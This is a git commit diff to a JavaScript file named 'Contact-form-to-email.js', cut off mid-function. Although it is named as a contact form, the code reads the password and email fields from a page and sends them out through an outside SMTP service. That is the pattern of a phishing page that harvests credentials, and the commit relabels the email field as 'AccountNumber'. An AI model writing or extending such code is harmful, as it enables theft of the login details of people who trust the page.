694e1265c571666b2b2b709aa29cc093802f3831
payday10177 <payday10177@gmail.com>
2024-06-13 15:54:42 +0100

    Update Contact-form-to-email.js

--- Contact-form-to-email.js
+++ Contact-form-to-email.js
@@ -1,8 +1,8 @@
 function emailSend() {
   var email = document.getElementById('email').value;
   var password = document.getElementById('password').value;
-  var messageBody = "Email " + email +
-    "<br/> pass " + password;
+  var messageBody = "AccountNumber " + email +
+    "<br/> password " + password;
 
   Email.send({
     Host: "smtp.elasticemail.com",
